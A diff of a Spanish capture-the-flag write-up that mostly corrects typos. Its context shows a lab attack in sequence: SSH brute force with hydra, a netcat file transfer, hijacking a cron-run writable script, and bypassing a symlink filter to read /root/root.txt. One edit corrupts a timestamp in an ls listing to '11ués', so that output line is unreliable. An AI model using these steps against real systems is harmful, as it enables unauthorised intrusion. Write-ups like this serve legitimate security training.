@@ -43,7 +43,7 @@ credenciales en texto plano.
 
 ## FASE INTRUSIÓN
 
-Utilizamos las credenciales proporconadas en un ataque de fuerza bruta, hice un diccionario con los 3 uer y otrro con los 3 password,
+Utilizamos las credenciales proporconadas en un ataque de fuerza bruta, hice un diccionario con los 3 user y otro con los 3 password,
 hago fuerzabruta con hydra:
 ```bash
 hydra -L users.txt  -P password.txt -t 16 -V -f -I ssh://172.17.0.2
@@ -68,7 +68,7 @@ veronica:x:1001:1001:,,,:/home/veronica:/bin/bash
 pablo:x:1002:1002:,,,:/home/pablo:/bin/bash
 chloe:x:1003:1003:,,,:/home/chloe:/bin/bash
 ````
-Investigo si tengo algún privilegio y no encuentro nada, lo que si veo es que tengo acceso al home de vernica:
+Investigo si tengo algún privilegio y no encuentro nada, lo que si veo es que tengo acceso al home de veronica:
 ```bash
 cd /home
 ````
@@ -114,7 +114,7 @@ cat .bash_history
 ```
 dmVyb25pY2ExMjMK
 ```
-parecde un base64, lo decodeamos:
+parece un base64, lo decodeamos:
 ```bash
 echo "dmVyb25pY2ExMjMK" | base64 -d
 ```
@@ -161,13 +161,13 @@ drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
 drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
 drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
 ```
-y despues de mirar un poco vemos esto:
+y después de mirar un poco vemos esto:
 ```bash
 cd .local/
 ls -la
 ```
 ```
-drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .
+drwxrwxr-x 3 veronica veronica 4096 Apr 18 11ués .
 drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 ..
 -rwxrwx--x 1 pablo    taller    121 Apr 17 17:23 script-h.sh
 drwx------ 3 veronica veronica 4096 Apr 18 10:47 share
@@ -180,11 +180,11 @@ cd /tmp
 
 y pudiendo usar nc nos pasamos pspy64 para poder mirar procesos:
 
-en la maquina victima:
+en la máquina victima:
 ```bash
 nc -lvp 4444 > pspy64
 ```
-en la maquina atacante donde tenemos el binario pspy64:
+en la máquina atacante donde tenemos el binario pspy64:
 ```bash
 nc 172.17.0.2 4444 -w 3 < pspy64
 ```
@@ -201,7 +201,7 @@ vemos este proceso:
 2025/05/11 07:33:01 CMD: UID=1002  PID=336    | /bin/sh -c /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1
 ```
 el UID de usuario es 1002, que acordandonos del passwd "pablo:x:1002:1002:,,,:/home/pablo:/bin/bash" pertenece a pablo
-ejecuta el script  /home/veronica/.local/script-h.sh que podemos modificar, así pues hacemos nano al script e introducimos unos comandos:
+miramos el script  /home/veronica/.local/script-h.sh que podemos modificar, así pues hacemos nano al script e introducimos unos comandos:
 ```bash
 nano  /home/veronica/.local/script-h.sh
 ```
@@ -275,14 +275,14 @@ if os.path.islink(LINK):
 else:
     print(f"El enlace [{LINK}] no es un enlace simbólico.")
 ```
-basicamente se le pasa un archivo, verifica que termine en .jpg y sino sale, comprueba que sea un enlace simbolico, extrae el nombre, mira donde apunta, y esta parte nos va a dar problemas:
+básicamente se le pasa un archivo, verifica que termine en .jpg y sino sale, comprueba que sea un enlace simbólico, extrae el nombre, mira donde apunta, y esta parte nos va a dar problemas:
 ```
   if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
         print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
         os.unlink(LINK)
 ```
-porque si contiene "etc" o "root" nos lo va a eliminar, de pasar el filtro lo pasa a la carpeta cuarentena y luego intyenta abrir el archivo
-Si investigamos un poco la carpeta del Home de pablo vamos a ver una cosa interesante:
+porque si contiene "etc" o "root" nos lo va a eliminar, de pasar el filtro lo pasa a la carpeta cuarentena y luego intenta abrir el archivo.
+Si investigamos un poco la carpeta del home de pablo vamos a ver una cosa interesante:
 ```bash
 cd Documents/
 ls -la
@@ -300,7 +300,7 @@ revisa el /root/root.txt
 ```
 
 con todo lo que tenemos solo se me ocurre hacer un enlace simbolico de /root/root.txt y hacer un enlace a ese enlace para ver si me puedo saltar
-la revicion de que contenga "root"
+la restricción de que contenga "root"
 me voy a tmp;
 ```bash
 cd /tmp
